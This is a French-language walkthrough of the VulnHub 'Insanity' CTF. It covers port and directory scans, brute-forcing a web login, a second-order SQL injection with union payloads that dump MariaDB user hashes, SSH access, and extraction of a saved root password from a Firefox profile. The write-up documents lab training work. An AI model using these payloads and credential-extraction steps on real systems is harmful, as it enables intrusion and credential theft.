---
title: Solution du CTF Insanity de VulnHub
tags: [CTF, VulnHub]
---

### Virtual Insanity

J'ai continué sur les CTF créés par *Thomas Williams* avec le [Insanity](https://vulnhub.com/series/insanity,354/) proposé sur VulnHub.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.134
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.134
Host is up (0.0012s latency).
Not shown: 65451 filtered tcp ports (no-response), 81 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| vulners: 
|   vsftpd 3.0.2: 
|       CVE-2021-3618   7.4     https://vulners.com/cve/CVE-2021-3618
|_      CVE-2015-1419   5.0     https://vulners.com/cve/CVE-2015-1419
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
--- snip ---
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.134:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/default-assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/default-assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/default-assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/default-assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.134:80/js/?C=S%3BO%3DD%27%20OR%20sqlspider
|_    http://192.168.56.134:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
| http-enum: 
|   /phpinfo.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|   /webmail/images/sm_logo.png: SquirrelMail
|   /css/: Potentially interesting folder w/ directory listing
|   /data/: Potentially interesting folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting folder w/ directory listing
|   /js/: Potentially interesting folder w/ directory listing
|_  /news/: Potentially interesting folder
MAC Address: 08:00:27:1E:8C:8E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.20 seconds
```

Le `phpinfo.php` retrouvé par `Nmap` mentionne le nom d'hôte `insanityhosting.vm` ainsi que le système qui est un CentOS x86_64.

Le FTP accepte les connexions anonymes, mais semble mal fonctionner en mode passif. On y trouve un dossier `pub` qui est vide.

Les dossiers `phpmyadmin` et `webmail` ont besoin d'une authentification. J'ai énuméré pour chercher des ressources supplémentaires :

```console
$ feroxbuster -u http://192.168.56.134/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.134/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       20w      235c http://192.168.56.134/news
301        7l       20w      234c http://192.168.56.134/img
200        1l        4w       31c http://192.168.56.134/index.php
200      479l     1477w    22263c http://192.168.56.134/index.html
301        7l       20w      235c http://192.168.56.134/data
301        7l       20w      234c http://192.168.56.134/css
301        7l       20w      233c http://192.168.56.134/js
301        7l       20w      238c http://192.168.56.134/webmail
301        7l       20w      236c http://192.168.56.134/fonts
301        7l       20w      241c http://192.168.56.134/monitoring
200        1l       10w       57c http://192.168.56.134/licence
301        7l       20w      241c http://192.168.56.134/phpmyadmin
200     1024l     5354w        0c http://192.168.56.134/phpinfo.php
403        8l       22w      458c http://192.168.56.134/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html
[####################] - 12m  3820686/3820686 0s      found:14      errors:122    
[####################] - 12m  3820686/3820686 4944/s  http://192.168.56.134/
```

Le fichier `index.php` indique juste `[105] Missing version directory`. Brute forcer un nom de paramètres en `GET` ou `POST` n'a mené nulle part.

Le dossier `data` pourrait correspondre à ce script, car il contient un fichier `VERSION`, cependant je ne vois pas quoi en faire.

Une énumération de virtual hosts avec le suffixe `infinityhosting.vm` n'a rien trouvé non plus.

Sur `/monitoring` on trouve une autre mire de login. Il est aussi mention d'un utilisateur nommé `otis` :

```html
<!-- Page title -->
<h1 class="title">Monitoring Service</h1>

<!-- Page description -->

<!-- Page cover image -->

<!-- Page content -->
<div class="page-content">
<p>Our team have been working hard to create you a free monitoring service for your servers. A special thank you to Otis, who led the team.</p>
<p>We are pleased to announce that from next week, you will be able to register for our monitoring service. This will remain free, whether you are a customer or not.</p>
<p>If you are interested, please e-mail us at <a href="mailto:hello@insanityhosting.vm,">hello@insanityhosting.vm,</a> and we can provide you more details.</p>                </div>
```

Les services sont longs à répondre, heureusement le mot de passe de `otis` est faible et au début de la wordlist `rockyou` :

```console
$ ffuf -u http://www.insanityhosting.vm/monitoring/index.php -d "username=otis&password=FUZZ" -X POST  -H "Content-type: application/x-www-form-urlencoded" -w wordlists/rockyou.txt -fr "Location: login.php"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://www.insanityhosting.vm/monitoring/index.php
 :: Wordlist         : FUZZ: wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=otis&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Location: login.php
________________________________________________

123456                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1753ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

L'interface de monitoring en question indique si un host/ip est "UP". On peut ajouter des entrées et les modifier, mais pas les supprimer.

Tout ceci sent très fort l'utilisation de la commande `ping` et donc l'injection de commande... mais rien n'a fonctionné.

Travailler dessus aurait été agréable si le code de l'appli échappait proprement les caractères HTML. Par exemple, si on rajoute une entrée dont le nom contient une double quote, celle-çi ferme l'attribut `href` du tag HTML permettant de modifier l'entrée. Il faut copier le nom, l'échapper pour l'URL (via `urllib.parse.quote` en Python par exemple) ou via édition du HTML dans les dev tools (via `html.escape` en Python) sans quoi impossible de modifier une entrée existante.

On a tout de même une forte intuition que l'appli est vulnérable à une faille SQL, car son comportement devient vite erratique.

J'ai énuméré les fichiers dans `monitoring` et trouvé un dossier de templates, ainsi qu'une référence à `smarty` :

```console
301        7l       20w      256c http://www.insanityhosting.vm/monitoring/images
301        7l       20w      259c http://www.insanityhosting.vm/monitoring/templates
302        0l        0w        0c http://www.insanityhosting.vm/monitoring/index.php
301        7l       20w      256c http://www.insanityhosting.vm/monitoring/assets
301        7l       20w      253c http://www.insanityhosting.vm/monitoring/css
200       95l      194w     4848c http://www.insanityhosting.vm/monitoring/login.php
301        7l       20w      252c http://www.insanityhosting.vm/monitoring/js
302        0l        0w        0c http://www.insanityhosting.vm/monitoring/logout.php
301        7l       20w      256c http://www.insanityhosting.vm/monitoring/vendor
301        7l       20w      258c http://www.insanityhosting.vm/monitoring/settings
301        7l       20w      255c http://www.insanityhosting.vm/monitoring/class
403        8l       22w      221c http://www.insanityhosting.vm/monitoring/cron.php
301        7l       20w      255c http://www.insanityhosting.vm/monitoring/fonts
301        7l       20w      256c http://www.insanityhosting.vm/monitoring/smarty
301        7l       20w      261c http://www.insanityhosting.vm/monitoring/templates_c
```

J'ai donc testé les SSTI en me basant sur [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=smarty#smarty-php) mais ça n'a pas fonctionné.

Finalement, j'ai testé les identifiants d'`otis` sur le webmail et ça fonctionnait (sans le `@insanityhosting.vm`).

### Second Order

En ajoutant une entrée dans `monitoring` avec un nom d'hôte inexistant, on finit par recevoir des emails :

```console
From:     monitor@localhost.localdomain
Subject:     WARNING
Date:     Thu, July 10, 2025 4:01 pm
To:     otis@localhost.localdomain

yolo is down. Please check the report below for more information.

ID, Host, Date Time, Status
18,yolo,"2025-07-10 15:59:01",0
20,yolo,"2025-07-10 16:00:01",0
22,yolo,"2025-07-10 16:01:01",0
```

À noter que `yolo` correspond ici au nom que l'on donne pour l'entrée, mais pas à la valeur du nom d'hôte.

Si je corrige mon entrée pour mettre un nom d'hôte valide, que j'attends que le status repasse à `UP`, puis rectifie l'entrée pour remettre l'hôte invalide alors, on retrouve bien le changement de status dans un nouvel email :

```
ID, Host, Date Time, Status
18,yolo,"2025-07-10 15:59:01",0
20,yolo,"2025-07-10 16:00:01",0
22,yolo,"2025-07-10 16:01:01",0
24,yolo,"2025-07-10 16:02:01",0
26,yolo,"2025-07-10 16:03:01",0
28,yolo,"2025-07-10 16:04:01",0
30,yolo,"2025-07-10 16:05:01",1
32,yolo,"2025-07-10 16:06:01",1
34,yolo,"2025-07-10 16:07:01",0
```

Si je mets des caractères qui peuvent altérer la requête SQL dans le nom de l'entrée, comme simple et double quote, alors plus aucun email n'arrive.

On est visiblement dans une situation de second-order SQL injection : les données sont proprement ajoutées en base lors de l'ajout d'une entrée, mais le script chargé du monitoring récupère les données et les réinjecte pour une nouvelle requête sans échapper les caractères dangereux.

Si on réfléchit à comment cela doit être implémenté, alors on doit avoir ce genre de requête lors de l'ajout :

```sql
insert into monitor (name, host) values ('nom', 'target');
```

Puis une tache CRON va récupérer les noms d'hôtes à pinger avec une requête simple. Potentiellement un timestamp est aussi utilisé pour ne pinger que les machines non testées depuis un laps de temps défini.

```sql
select name, host from monitor;
```

Pour chaque `ping`, un résultat doit être stocké en base. D'après les données reçues par email ça doit ressembler à ça :

```sql
insert into logs (host, date, status) values ('target', now(), status);
```

Si le `ping` n'a pas eu de réponse, un email est généré en récupérant la totalité des logs pour l'entrée correspondante :

```sql
select * from logs where name='nom';
```

Ce serait donc ici que la second-order SQL injection a lieu.

On va faire en sorte que cette requête devienne :

```sql
select * from logs where name='' union select 0,version(),user(),0 -- a;
```

Pour cela, j'ai créé une nouvelle entrée. Aucun mail n'est parvenu avec l'injection `' union select 0,version(),user(),0 -- a` mais en changeant les simples quote par des doubles ça a fonctionné :

```
" union select 0,version(),user(),0 -- a; is down. Please check the report below for
more information.

ID, Host, Date Time, Status
0,5.5.65-MariaDB,root@localhost,0
```

Le script utilise le compte `root` de la base de données. On va en profiter pour récupérer les hashs :

```
" union select 0,concat(User,":",Password),authentication_string,0 from mysql.user -- a
```

`Password` est une colonne qui a été dépréciée, voir [MySQL user DB does not have password columns - Stack Overflow](https://stackoverflow.com/a/31122246). Il faut penser à obtenir `authentication_string` aussi.

```
ID, Host, Date Time, Status
0,root:*CDA244FF510B063DA17DFF84FF39BA0849F7920F,,0
0,:,,0
0,elliot:,*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9,0
```

Le hash de `elliot` se casse en `elliot123`.

Le hash root ne se casse pas avec `rockyou` et le compte `elliot` ne donne pas d'accès intéressant via `phpmyadmin` (il a accès à `information_schema` mais pas à la table `TABLES` par exemple).

Avec `database()`, j'obtiens le nom de la base courante qui est `monitoring`.

L'énumération SQL s'arrête ici car les identifiants sont acceptés par SSH.

### Remember me

Premier point intéressant : un dossier `.mozilla`  est présent, ce qui est assez inhabituel sur les CTFs.

```console
[elliot@insanityhosting ~]$ alias ls="ls -alh --color"
[elliot@insanityhosting ~]$ ls
total 16K
drwx------. 5 elliot elliot 144 16 août   2020 .
drwxr-xr-x. 7 root   root    76 16 août   2020 ..
lrwxrwxrwx. 1 root   root     9 16 août   2020 .bash_history -> /dev/null
-rw-r--r--. 1 elliot elliot  18  1 avril  2020 .bash_logout
-rw-r--r--. 1 elliot elliot 193  1 avril  2020 .bash_profile
-rw-r--r--. 1 elliot elliot 231  1 avril  2020 .bashrc
drwx------. 3 elliot elliot  21 16 août   2020 .cache
drwx------. 5 elliot elliot  66 16 août   2020 .mozilla
drwx------. 2 elliot elliot  25 16 août   2020 .ssh
-rw-------. 1 elliot elliot 100 16 août   2020 .Xauthority
```

On va laisser planner le doute et fouiller plus, car il y a d'autres utilisateurs :

```console
[elliot@insanityhosting ~]$ find /home/ -ls 2> /dev/null | grep -v elliot
16881309    0 drwxr-xr-x   7 root     root           76 août 16  2020 /home/
17376409    0 drwx------   2 admin    admin          62 août 16  2020 /home/admin
26167613    0 drwx------   3 otis     otis           95 août 16  2020 /home/otis
1125183    0 drwx------   2 nicholas nicholas       83 août 16  2020 /home/nicholas
17129814    0 drwx------   3 monitor  monitor        99 août 16  2020 /home/monitor
[elliot@insanityhosting ~]$ find / -user otis -ls 2> /dev/null 
1125182   12 -rw-------   1 otis     mail         8761 juil. 10 18:08 /var/spool/mail/otis
1756462    4 -rw-rw-rw-   1 otis     otis           36 août 16  2020 /var/spool/mail/.subscriptions
26167613    0 drwx------   3 otis     otis           95 août 16  2020 /home/otis
```

Je me suis renseigné un peu et ce fichier `.subscriptions` ne semble pas actionable.

J'ai surveillé les taches CRON avec `pspy` et je n'ai rien trouvé d'exploitable non plus.

```console
2025/07/10 18:16:01 CMD: UID=1004 PID=13444  | /usr/sbin/CROND -n 
2025/07/10 18:16:01 CMD: UID=1004 PID=13445  | /usr/bin/php -q /var/www/html/monitoring/cron.php 
2025/07/10 18:16:02 CMD: UID=0    PID=13446  | sendmail: startup with localhost
2025/07/10 18:16:02 CMD: UID=0    PID=13447  | sendmail: ./56AHG2jH013446 from queue
2025/07/10 18:16:02 CMD: UID=1004 PID=13448  | sh -c ping -n -c 1 -t 255 -W 1 127.0.0.1 2>&1 
2025/07/10 18:16:02 CMD: UID=0    PID=13450  | procmail -f monitor@localhost.localdomain -t -Y -a  -d otis 
2025/07/10 18:16:02 CMD: UID=1004 PID=13449  | sh -c ping -n -c 1 -t 255 -W 1 127.0.0.1 2>&1 
2025/07/10 18:16:02 CMD: UID=1004 PID=13452  | sh -c ping -n -c 1 -t 255 -W 1 127.0.0.1 2>&1 
2025/07/10 18:16:02 CMD: UID=1004 PID=13453  | ping -n -c 1 -t 255 -W 1 127.0.0.1
```

J'ai retrouvé le hash du compte `root` sur mysql, mais il n'est pas utilisé ailleurs.

```php
<?php

$databaseUsername = 'root';
$databasePassword = 'AesBeery8g9JLcWW';
$databaseServer = 'localhost';
$databaseName = 'monitoring';
$secureCookie = True;

?>
```

Finalement j'ai utilisé mon fork de [firefox_decrypt](https://github.com/devl00p/firefox_decrypt) pour extraire les identifiants du vault Firefox :

```console
$ scp -r elliot@192.168.56.136:.mozilla/firefox .
$ git clone git@github.com:devl00p/firefox_decrypt.git
$ cd firefox_decrypt/
$ python3 firefox_decrypt.py ../firefox
Select the Mozilla profile you wish to decrypt
1 -> wqqe31s0.default
2 -> esmhp32w.default-default
2

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
```

Le mot de passe permet de passer `root` :

```console
[root@insanityhosting ~]# id
uid=0(root) gid=0(root) groupes=0(root)
[root@insanityhosting ~]# ls
anaconda-ks.cfg  flag.txt
[root@insanityhosting ~]# cat flag.txt 
    ____                       _ __       
   /  _/___  _________ _____  (_) /___  __
   / // __ \/ ___/ __ `/ __ \/ / __/ / / /
 _/ // / / (__  ) /_/ / / / / / /_/ /_/ / 
/___/_/ /_/____/\__,_/_/ /_/_/\__/\__, /  
                                 /____/   

Well done for completing Insanity. I want to know how difficult you found this - let me know on my blog here: https://security.caerdydd.wales/insanity-ctf/

Follow me on twitter @bootlesshacker

https://security.caerdydd.wales

Please let me know if you have any feedback about my CTF - getting feedback for my CTF keeps me interested in making them.

Thanks!
Bootlesshacker
```
